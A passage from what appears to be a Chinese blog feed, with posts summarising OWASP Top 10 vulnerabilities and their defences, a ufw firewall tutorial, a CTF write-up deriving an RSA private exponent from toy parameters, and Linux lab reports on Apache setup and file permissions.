        <content type="html"><![CDATA[<h2 id="1-注入攻击"><a href="#1-注入攻击" class="headerlink" title="1. 注入攻击"></a>1. 注入攻击</h2><p>一个 <code>注入攻击</code> 是指恶意代码的输入攻击者到应用程序迫使其执行命令妥协数据或整个应用程序。最常见的注入攻击类型是<code> SQL 注入</code>和<code>跨站点脚本 (XSS)</code> 攻击，但也有<code>代码注入</code>、<code>命令注入</code>、<code>CCS 注入</code>等。</p><p>SQL 注入 是指利用由于用户输入中缺少元字符屏蔽或验证而导致的 <code>SQL 数据库漏洞</code>。 </p><p>攻击者试图通过有权访问数据库的应用程序注入他自己的数据库命令。但是，由于请求未正确验证，插入的代码更改了原始 SQL 命令，因此更改了有利于攻击者的结果。 </p><p>攻击成功后，攻击者可以窥探、修改或完全删除数据，并控制服务器。为此，攻击者有不同的方法来破坏系统。例如，可以通过响应时间或错误消息找到进入系统的途径。</p><h3 id="1-1-SQL注入攻击的防范"><a href="#1-1-SQL注入攻击的防范" class="headerlink" title="1.1 SQL注入攻击的防范"></a>1.1 SQL注入攻击的防范</h3><p>避免注入缺陷的主要方法是将数据库中的数据与命令和查询分开，即将其与 Web 应用程序逻辑分开。这可以通过几种不同的方式实现，包括：</p><ul><li>使用无需使用解释器或使用参数化查询的安全 API </li><li>引入积极的服务器端输入验证（白名单）</li><li>如果应用程序中需要特殊字符，则应尽可能通过特定解释器的转义语法避免使用这些字符</li><li>在查询中使用数据库控件，例如 LIMIT SQL 子句，以最大限度地减少注入成功时暴露的数据量</li></ul><h2 id="2-破解认证"><a href="#2-破解认证" class="headerlink" title="2. 破解认证"></a>2. 破解认证</h2><p>与<code>身份验证</code>和<code>会话管理</code>相关的应用程序功能  经常被错误地实现，允许攻击者破坏密码、密钥或会话令牌或利用其他实现缺陷来临时或永久地假设用户的身份。 </p><p>攻击者可以利用该漏洞<code>劫持用户会话</code>，访问或修改其无权访问的信息。</p><h3 id="2-1-损坏的身份验证漏洞的防范"><a href="#2-1-损坏的身份验证漏洞的防范" class="headerlink" title="2.1 损坏的身份验证漏洞的防范"></a>2.1 损坏的身份验证漏洞的防范</h3><p>为避免利用损坏的<code>身份验证</code>进行攻击，OWASP 建议采取以下措施：</p><ul><li>引入确定密码弱点或强度的密码检查</li><li>将密码长度、复杂性和轮换与强大且现代的基于证据的密码策略保持一致</li><li>引入多因素身份验证，阻止使用被盗凭据、暴力攻击、填充等</li><li>使用服务器端安全会话管理器生成时间有限的新的随机会话 ID</li><li>避免 URL 中的会话 ID，安全地存储它们，并确保它们在用户注销、会话超时和空闲后失效</li><li>使用默认凭据时不允许部署 </li><li>在监控失败的登录尝试时限制或延迟它们。检测到攻击时向管理员发出警报</li></ul><h2 id="3-敏感数据暴露"><a href="#3-敏感数据暴露" class="headerlink" title="3. 敏感数据暴露"></a>3. 敏感数据暴露</h2><p><code>敏感数据泄露</code>是最常见的攻击之一。它包括访问、修改或窃取未受保护的静止或传输中的数据（传输的数据）。此类数据通常包括<code>个人身份信息 (PII)</code>，例如<code>凭据</code>、<code>健康记录</code>、<code>信用卡号</code>等。缺乏加密是数据最终暴露的原因之一。</p><p>获取敏感数据访问权限的方法各不相同，但可能包括攻击者窃取密钥、执行路径攻击（也称为<code>中间人</code>）、从服务器或用户窃取明文数据等。 </p><p>模糊测试 是一种使用无效、随机或意外数据来产生意外状态或访问隐藏特征的技术。有多种类型的模糊测试：</p><ul><li>基于观察数据的模糊测试</li><li>在没有先前知识的情况下进行模糊测试</li></ul><h3 id="3-1-敏感数据泄露的防范"><a href="#3-1-敏感数据泄露的防范" class="headerlink" title="3.1 敏感数据泄露的防范"></a>3.1 敏感数据泄露的防范</h3><p>您可以采取多种措施来保护任何敏感数据免遭泄露。这些包括：</p><ul><li>实施<code>传输层安全性</code> (TLS) 以保护传输中的数据 </li><li>尽可能避免存储敏感数据，或存储时间超过所需时间</li><li>加密所有需要存储的静态数据</li><li>通过 HTTP 严格传输安全 ( HSTS ) 或类似指令强制加密</li><li>不要缓存包含敏感数据的用户响应</li><li>对数据进行分类（处理、存储或传输）并根据分类应用控制</li><li>实施强大的标准算法、协议和密钥</li><li>使用<code>哈希函数</code>，例如 brcrypt、scrypt、Argon2、PBKDF2，这些函数总是对密码进行加盐和哈希处理</li></ul><h2 id="4-XML-外部实体-XXE"><a href="#4-XML-外部实体-XXE" class="headerlink" title="4. XML 外部实体 (XXE)"></a>4. XML 外部实体 (XXE)</h2><p>默认情况下，许多旧的或配置不当的 <code>XML 处理器</code>会评估  XML 文档中的外部实体引用。这可以被设法上传 XML 文档（例如 DOCX 或 SVG 文件）或在 XML 文档中包含恶意内容的攻击者利用。</p><p>在这种情况下，外部实体可用于使用文件 URI 处理程序提取内部文件。它们还可以启用内部文件共享、内部端口扫描、远程请求执行和拒绝服务攻击 (DOS) 的性能。</p><h3 id="4-1-XML-外部实体攻击的防范"><a href="#4-1-XML-外部实体攻击的防范" class="headerlink" title="4.1 XML 外部实体攻击的防范"></a>4.1 XML 外部实体攻击的防范</h3><p>为了防止这种攻击，开发人员需要接受培训以测试、识别和缓解 XXE。此外，OWASP 建议采取以下措施：</p><ul><li>避免对潜在敏感信息进行序列化，并使用不太复杂的数据格式，例如 JSON</li><li>白名单服务器端输入验证，以避免通过 XML 文档发送恶意数据</li><li>通过 XML 模式验证传入的 XML，即 XSD 验证</li><li>确保定期修补或升级 XML 库和处理器</li><li>在解析器中完全禁用文档类型定义 (DTD) 处理（这也可以保护解析器免受 DOS 攻击）</li><li>手动查看 XXE 实例的源代码</li></ul><h2 id="5-破坏访问控制"><a href="#5-破坏访问控制" class="headerlink" title="5. 破坏访问控制"></a>5. 破坏访问控制</h2><p>损坏的访问控制 是指对经过身份验证的用户的行为实施限制时存在的漏洞。当限制没有得到正确执行时，攻击者可以利用这个弱点来获得对系统功能和敏感个人数据的未经授权的管理访问。他们还可以创建、修改或删除数据。</p><h3 id="5-1-访问控制失效的防范"><a href="#5-1-访问控制失效的防范" class="headerlink" title="5.1 访问控制失效的防范"></a>5.1 访问控制失效的防范</h3><p>为了有效地阻止访问控制，它必须在受信任的服务器端代码或无服务器 API 中强制执行。这将防止攻击者修改访问控制检查或元数据。OWASP 列出了以下措施来防止此类攻击：</p><ul><li>排除公共资源，默认拒绝</li><li>引入访问控制机制并在整个应用程序中重复使用它们</li><li>强制记录所有权</li><li>记录和监控访问控制失败，如果需要通知管理员（重复登录尝试）</li><li>注销后使 JSON Web 令牌 (JWT) 无效</li><li>通过域模型强制执行独特的应用程序业务限制要求</li><li>确保元数据和备份文件不存在于 Web 根目录中</li><li>禁用网络服务器目录列表</li><li>执行功能访问控制单元和集成测试</li></ul><p>此外，您可能还要：</p><ul><li>删除不活动或不必要的帐户</li><li>对所有接入点实施多因素身份验证</li><li>如果不需要一些接入点，则减少接入点的数量</li><li>实施最小权限原则 (PoLP) </li><li>关闭服务器上不需要的服务</li></ul><h2 id="6-安全配置错误"><a href="#6-安全配置错误" class="headerlink" title="6. 安全配置错误"></a>6. 安全配置错误</h2><p><code>安全配置错误</code> 是打开攻击面的常见问题。这通常是由于： </p><ul><li>不安全的默认配置</li><li>不完整或临时配置</li><li>未修补的缺陷</li><li>未使用的页面</li><li>未受保护的文件和目录</li><li>开放云存储</li><li>错误配置的 HTTP 标头或加密</li><li>包含敏感信息的详细错误消息</li></ul><p>不仅必须安全地配置所有<code>操作系统</code>、<code>框架</code>、<code>库</code>和<code>应用程序</code>，而且必须及时修补&#x2F;升级它们。</p><p>像 Crashtest Security 这样的自动化渗透测试工具可以帮助检测安全漏洞，这些漏洞可能通过安全配置错误而导致漏洞。注册免费试用并 在几分钟内开始您的第一次扫描。</p><h3 id="6-1-安全配置错误攻击的防范"><a href="#6-1-安全配置错误攻击的防范" class="headerlink" title="6.1 安全配置错误攻击的防范"></a>6.1 安全配置错误攻击的防范</h3><p>OWASP 建议实施安全安装过程。除此之外，你应该：</p><ul><li>开发和自动化一个流程，该流程允许快速轻松地部署配置相同但可通过不同凭据访问的安全环境</li><li>部署最小平台并删除未使用的功能和框架或不安装</li><li>引入分离组件和租户的分段应用架构</li><li>查看和更新所有安全说明、更新和补丁的配置，尤其是云存储权限</li><li>在所有环境中自动监控和验证安全配置的有效性</li><li>借助自动化工作流程实时解决安全问题</li></ul><h2 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a>7. 跨站脚本（XSS）</h2><p><code>跨站点脚本</code>是将<code>客户端脚本</code>注入到 <code>Web 应用程序</code>中，这是通过不对用户输入进行<code>验证</code>和<code>正确编码</code>来实现的。恶意脚本在最终用户的浏览器中执行并启用各种攻击——从窃取他们的会话到监控和更改受影响网站上的任何操作。 </p><p>存在不同类型的跨站点脚本攻击，具体取决于恶意脚本是非持久性注入还是持久性注入。此外，还区分了由客户端或服务器端有缺陷的输入验证引起的漏洞。</p><h3 id="7-1-跨站脚本（XSS）的防范"><a href="#7-1-跨站脚本（XSS）的防范" class="headerlink" title="7.1 跨站脚本（XSS）的防范"></a>7.1 跨站脚本（XSS）的防范</h3><p>根据 OWASP 的说法，防止此类攻击的主要方法是将<code>不受信任</code>和<code>未经验证</code>的数据输入与活动浏览器内容分开。这可以通过以下方式完成：</p><ul><li>使用 <code>React JS</code>、<code>Ruby on Rails </code>和其他在很大程度上避免 XSS 设计的框架</li><li>避免 HTML 中不受信任的 HTTP 请求数据，除非在 OWASP 备忘单系列“XSS 预防”中定义的允许插槽中</li><li>在 HTML 元素中插入任何不受信任的数据之前使用 HTML 编码</li><li>对基于 DOM 的 XSS 应用上下文敏感编码</li><li>实施内容安全策略 (CSP)，为客户端资源创建源允许列表。如果没有允许通过本地文件插入恶意代码的漏洞，这将很有帮助</li></ul><h2 id="8-不安全的反序列化"><a href="#8-不安全的反序列化" class="headerlink" title="8. 不安全的反序列化"></a>8. 不安全的反序列化</h2><p><code>不安全反序列化</code> 是一种攻击，其中将被操纵的对象注入到 Web 应用程序的上下文中。如果存在应用程序漏洞，则对象被反序列化并执行，从而导致 <code>SQL 注入</code>、<code>路径遍历</code>、<code>应用程序拒绝服务</code>和<code>远程代码</code>执行。</p><h3 id="8-1-不安全的反序列化的防范"><a href="#8-1-不安全的反序列化的防范" class="headerlink" title="8.1 不安全的反序列化的防范"></a>8.1 不安全的反序列化的防范</h3><p>为了防止不安全的反序列化，OWASP 建议执行以下步骤：</p><ul><li>拒绝来自不受信任来源的序列化对象</li><li>仅使用允许原始数据类型的序列化介质</li><li>实施数字签名以检查序列化对象的完整性</li><li>在反序列化期间强制执行严格的类型约束以检测意外子句 </li><li>在可能的情况下，在低权限环境中隔离和运行反序列化代码以防止未经授权的操作</li><li>记录反序列化异常和失败的实例</li><li>监视和&#x2F;或限制来自反序列化的服务器或容器的任何传出或传入网络连接</li></ul><h2 id="9-使用已知漏洞的组件"><a href="#9-使用已知漏洞的组件" class="headerlink" title="9.使用已知漏洞的组件"></a>9.使用已知漏洞的组件</h2><p>库、框架和其他软件模块等组件的权限与应用程序的权限相同。如果利用<code>易受攻击的组件</code>，则可能会丢失数据和服务器接管。使用具有已知漏洞的组件的应用程序和 API 可能会破坏应用程序防御并引发各种攻击和影响。这是一个普遍存在的问题。</p><p>为了帮助您评估您使用的组件是否存在已知漏洞，指纹扫描仪会尝试检测任何Web 服务器 或 Web 应用程序 框架以及服务器上运行的相关版本。</p><h3 id="9-1-使用已知漏洞的组件的防范"><a href="#9-1-使用已知漏洞的组件的防范" class="headerlink" title="9.1 使用已知漏洞的组件的防范"></a>9.1 使用已知漏洞的组件的防范</h3><p>要修复此类组件的使用，您应该：</p><ul><li>仅通过安全链接使用来自官方来源的组件。使用签名的包来最小化包中包含恶意组件的可能性</li><li>监控任何未维护且未为旧版本提供安全补丁的库和组件</li><li>部署虚拟补丁以监控、检测和防范未打补丁组件的问题</li><li>删除所有未使用的依赖项以及不需要的功能、组件、文件和文档</li><li>保持客户端和服务器端组件及其版本和依赖项的最新清单。监控组件漏洞的重要来源，并尽可能自动化流程</li><li>在应用程序的生命周期内创建并持续执行监视、分类、更新或更改配置</li></ul><h2 id="10-日志记录和监控不足"><a href="#10-日志记录和监控不足" class="headerlink" title="10. 日志记录和监控不足"></a>10. 日志记录和监控不足</h2><p><code>日志记录</code>和<code>监控</code>不足，再加上与事件响应的集成缺失或无效，使攻击者能够进一步攻击系统，保持持久性，转向更多系统，并<code>篡改</code>、<code>提取</code>或<code>破坏数据</code>。 </p><p>大多数违规研究表明检测违规的时间超过 200 天，通常由外部方而不是内部流程或监控检测到。</p><h3 id="10-1-因日志和监控不足而导致的攻击的防范"><a href="#10-1-因日志和监控不足而导致的攻击的防范" class="headerlink" title="10.1 因日志和监控不足而导致的攻击的防范"></a>10.1 因日志和监控不足而导致的攻击的防范</h3><p>为了防止由于此问题而出现的常见漏洞，OWASP 建议您：</p><ul><li>在登录、访问控制失败和服务器端输入验证失败期间记录足够的用户上下文，并且日志数据保留足够长的时间。这将帮助您发现可疑活动和帐户</li><li>使用日志管理解决方案易于处理的日志格式</li><li>对所有高价值交易实施具有完整性控制的审计跟踪，以避免删除或篡改企图</li><li>使用监控和警报及时发现可疑活动并采取措施</li><li>引入事件响应和恢复计划以有效应对攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> OWASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux设置安全访问控制策略</title>
      <link href="/2021/05/06/95681893a77a-q1jun/"/>
      <url>/2021/05/06/95681893a77a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux添加访问控制策略"><a href="#Linux添加访问控制策略" class="headerlink" title="Linux添加访问控制策略"></a>Linux添加访问控制策略</h1><blockquote><p> ubuntu系统默认已安装ufw。</p></blockquote><p>Linux 2.4内核以后提供了一个非常优秀的防火墙工具：<strong>netfilter&#x2F;iptables</strong>,他免费且功能强大，可以对流入、流出的信息进行细化控制，它可以 实现防火墙、NAT（网络地址翻译）和数据包的分割等功能。netfilter工作在内核内部，而iptables则是让用户定义规则集的表结构。</p><p>但是iptables的规则稍微有些“复杂”，因此ubuntu提供了ufw这个设定工具，以简化iptables的某些设定，其后台仍然是 iptables。ufw 即uncomplicated firewall的简称，一些复杂的设定还是要去iptables。</p><p>ufw相关的文件和文件夹有：</p><ul><li><p>&#x2F;etc &#x2F;ufw&#x2F;：里面是一些ufw的环境设定文件，如 before.rules、after.rules、sysctl.conf、ufw.conf，及 for ip6 的 before6.rule 及 after6.rules。<br>这些文件一般按照默认的设置进行就ok。若开启ufw之 后，__&#x2F;etc&#x2F;ufw&#x2F;sysctl.conf__会覆盖默认的__&#x2F;etc&#x2F;sysctl.conf__文件，若你原来的&#x2F;etc&#x2F;sysctl.conf做了修 改，启动ufw后，若&#x2F;etc&#x2F;ufw&#x2F;sysctl.conf中有新赋值，则会覆盖&#x2F;etc&#x2F;sysctl.conf的，否则还以&#x2F;etc &#x2F;sysctl.conf为准。当然你可以通过修改&#x2F;etc&#x2F;default&#x2F;ufw中的“IPT_SYSCTL&#x3D;”条目来设置使用哪个 sysctrl.conf.</p></li><li><p>&#x2F;var&#x2F;lib&#x2F;ufw&#x2F;user.rules 这个文件中是我们设置的一些防火墙规则，打开大概就能看明白，有时我们可以直接修改这个文件，不用使用命令来设定。修改后记得ufw reload重启ufw使得新规则生效。</p></li></ul><h2 id="0x01-安装UFW"><a href="#0x01-安装UFW" class="headerlink" title="0x01 安装UFW"></a>0x01 安装UFW</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br></pre></td></tr></table></figure><h2 id="0x02-启用UFW"><a href="#0x02-启用UFW" class="headerlink" title="0x02 启用UFW"></a>0x02 启用UFW</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw enable</span><br><span class="line">sudo ufw default deny</span><br></pre></td></tr></table></figure><p>打开ufw防火墙，并在系统启动时自动开启。</p><p>关闭所有外部对本机的访问，但本机访问外部正常。</p><h2 id="0x03-设置访问控制策略"><a href="#0x03-设置访问控制策略" class="headerlink" title="0x03 设置访问控制策略"></a>0x03 设置访问控制策略</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow|deny [service]</span><br></pre></td></tr></table></figure><p>打开或关闭某个端口，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow smtp #允许所有的外部ip访问本机的25/tcp(smtp)端口</span><br><span class="line">sudo ufw allow 22/tcp #允许所有的外部ip访问本机的22/tcp(ssh)端口</span><br><span class="line">sudo ufw allow 53 #允许所有的外部ip访问本机的53端口(tcp/udp)</span><br><span class="line">sudo ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53</span><br><span class="line">sudo ufw deny smtp #禁止外部访问smtp服务</span><br><span class="line">sudo ufw delete allow smtp #删除上面建立的某条规则</span><br></pre></td></tr></table></figure><p>给某一ip添加规则：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow from 192.168.1.100 #允许此ip访问所有的本机端口</span><br><span class="line">sudo ufw delete allow from 192.168.1.100 #删除上面的规则</span><br></pre></td></tr></table></figure><h2 id="0x04-查看UFW防火墙状态"><a href="#0x04-查看UFW防火墙状态" class="headerlink" title="0x04 查看UFW防火墙状态"></a>0x04 查看UFW防火墙状态</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure><h2 id="0x05-开启-x2F-关闭UFW防火墙"><a href="#0x05-开启-x2F-关闭UFW防火墙" class="headerlink" title="0x05 开启&#x2F;关闭UFW防火墙"></a>0x05 开启&#x2F;关闭UFW防火墙</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw enable|disable</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> ufw </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUoj 之 RSA</title>
      <link href="/2021/04/12/710b737857f5-q1jun/"/>
      <url>/2021/04/12/710b737857f5-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUOJ-rsa"><a href="#BUUOJ-rsa" class="headerlink" title="BUUOJ rsa"></a>BUUOJ rsa</h1><h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220313201840503.png" alt="image-20220313201840503"></p><h2 id="0x02-RSA非对称加密算法"><a href="#0x02-RSA非对称加密算法" class="headerlink" title="0x02 RSA非对称加密算法"></a>0x02 RSA非对称加密算法</h2><p><strong>公钥与私钥的产生</strong> ：</p><ol><li>随机选择两个不同大质数 <code>p </code>和<code> q</code>，计算 <code>N=p×q</code></li><li>根据欧拉函数，求得<code> φ(N)=φ(p)φ(q)=(p−1)(q−1)</code></li><li>选择一个小于 <code>φ(N)</code> 的整数 <code>e</code>，使 <code>e</code> 和 <code>φ(N)</code> 互质。并求得 <code>e</code> 关于<code> φ(N)</code> 的模反元素，命名为 <code>d</code>，有 <code>ed≡1(modφ(N))</code></li><li>将 <code>p</code> 和 <code>q</code>的记录销毁</li></ol><p>此时，<code>(N,e)</code>是公钥，<code>(N,d)</code> 是私钥。</p><h3 id="0x0201-消息加密"><a href="#0x0201-消息加密" class="headerlink" title="0x0201 消息加密"></a>0x0201 消息加密</h3><p>首先需要将消息 以一个双方约定好的格式转化为一个小于<code> N</code>，且与 <code>N </code>互质的整数 <code>m</code>。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：</p><p><strong>m^e≡c(modN)</strong></p><h3 id="0x0202-消息解密"><a href="#0x0202-消息解密" class="headerlink" title="0x0202 消息解密"></a>0x0202 消息解密</h3><p>利用密钥 <code>d</code> 进行解密。</p><p><strong>c^d≡m(modN)</strong></p><h2 id="0x03-解密脚本："><a href="#0x03-解密脚本：" class="headerlink" title="0x03 解密脚本："></a>0x03 解密脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.10</span><span class="number">.2</span> (main, Feb  <span class="number">2</span> <span class="number">2022</span>, 05:<span class="number">51</span>:<span class="number">25</span>) [Clang <span class="number">13.0</span><span class="number">.0</span> (clang-<span class="number">1300.0</span><span class="number">.29</span><span class="number">.3</span>)] on darwin</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = <span class="number">473398607161</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = <span class="number">4511491</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = <span class="number">17</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(d)</span><br><span class="line"><span class="number">125631357777427553</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课堂Linux实验4</title>
      <link href="/2021/04/10/952a4d8eea3e-q1jun/"/>
      <url>/2021/04/10/952a4d8eea3e-q1jun/</url>
      
        <content type="html"><![CDATA[<p>(1)查看本机IP地址。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202165106311.png" alt="image-20211202165106311"></p><p>本机IP地址为：10.211.55.10</p><p>(2)测试Apache软件是否安装成功。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202165353569.png" alt="image-20211202165353569"></p><p>通过<code>systemctl status apache2</code> 查看apache运行情况，安装完成</p><p>(3) 将Apache的怔听端口改为8080。</p><p>1.进入apache的配置文件目录:<code>/etc/apache2/</code>,在ports.conf 文件中修改侦听端口为8080:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202165728936.png" alt="image-20211202165728936"></p><ol start="2"><li><p>重启apache，命令：<code>systemctl reload apache2</code>,在浏览器输入10.211.55.10:8080访问页面<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202165846969.png" alt="image-20211202165846969"></p><p>修改端口8080成功。</p></li></ol><p>(4) 将文档根目录设置为&#x2F;web, 默认首页文件使用default.htm，内容为”Welcome to $USERNAME’s world.” 。</p><ol><li>新建目录&#x2F;web：<code>sudo mkdir /web</code></li><li>设置目录所有者: <code>sudo chown -R www-data: /web</code></li><li>进入apache配置目录：<code>cd /etc/apache2/</code>，修改apache.conf中的：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202170207486.png" alt="image-20211202170207486"><br>改为：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202170228153.png" alt="image-20211202170228153"></li><li>进入site-available文件夹下，将默认文件<code>000-default.conf</code> 删除或改名为<code>000-default.conf.bak</code>,然后新建文件：<br><code>touch web.conf</code></li><li>编辑web.conf文件内容如下：<code>vim web.conf</code><br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202170613248.png" alt="image-20211202170613248"></li></ol><p>6.在默认目录&#x2F;web下新建文件default.htm并且输入以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo touch default.htm</span><br><span class="line">vim default.htm</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202171059087.png" alt="image-20211202171059087"></p><ol start="7"><li>保存之后，输入 <code>systemctl reload apache2</code>重启apache服务加载数据</li><li>在浏览器输入：10.211.55.10:8080 回车：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211202171314518.png" alt="image-20211202171314518"></li></ol><p>【实验小结】：</p><p>​    这次实验通过搭建Apache的web环境，让我体会到了linux系统搭建web环境的便捷，只需要通过包管理器Apt-get就能简单的安装好apache的环境，只需要自己稍加配置就能让它运行起来，其中要注意配置文件“*.conf”的语法是否正确，以及更改了默认目录之后的权限问题，Linux是一个严谨的系统，如果不稍加注意 将会酿成大错。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> 课堂笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课堂Linux实验3</title>
      <link href="/2021/04/07/bf7be5723f6b-q1jun/"/>
      <url>/2021/04/07/bf7be5723f6b-q1jun/</url>
      
        <content type="html"><![CDATA[<p>文件和目录的访问权限关系到整个Linux操作系统的安全性，作为一个合格的Linux 操作系统管理员，必须深刻理解Linux文件权限的基本概念并能够熟练地进行权限设置，同时对用户和组群进行熟练操作管理。</p><p>‏(1) 建立用户user01、user02, 设置用户密码。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121111831645.png" alt="image-20211121111831645"></p><p>‏(2) 将新建用户user01 、user02 分别加入stu01 、stu02 组群中。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121112321937.png" alt="image-20211121112321937"></p><p>‏(3) 使用 su 命令进行用户登录切换，切换到root用户。‎</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121112501563.png" alt="image-20211121112501563"></p><p>‏(4) 在的&#x2F;tmp目录下创建文件test01.txt 和目录test-dir ，并将其所有者和属组分别设置为user01和stu01 。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121112916335.png" alt="image-20211121112916335"></p><p>‏(5) 将文件test01.txt的权限修改为以下两种。对于每种权限，分别切换到user01和user02用户，验证这两个用户能否对test01.txt进行读取、写入、重命名和删除操作。</p><p>‎</p><p>‏① -rwxrw-rw-（766）</p><p><strong>user01:</strong></p><ul><li>写<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121120421189.png" alt="image-20211121120421189"></li><li>读<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121120437137.png" alt="image-20211121120437137"></li><li>重命名<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121120511304.png" alt="image-20211121120511304"></li><li>删除<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121120528137.png" alt="image-20211121120528137"></li></ul><p><strong>user02:</strong></p><ul><li>写<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121121206247.png" alt="image-20211121121206247"></li><li>读<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121121219716.png" alt="image-20211121121219716"></li><li>重命名<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121121239683.png" alt="image-20211121121239683"></li><li>删除<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121121253721.png" alt="image-20211121121253721"></li></ul><p>‏② -rwxr–r–（744）</p><p><strong>user01:</strong></p><ul><li>写<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121210955660.png" alt="image-20211121210955660"></li><li>读<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211008780.png" alt="image-20211121211008780"></li><li>重命名<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211023700.png" alt="image-20211121211023700"></li><li>删除<br>‎<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211036695.png" alt="image-20211121211036695"></li></ul><p><strong>user02:</strong></p><ul><li>写<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211355261.png" alt="image-20211121211355261"></li><li>读<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211415873.png" alt="image-20211121211415873"></li><li>重命名<br><img 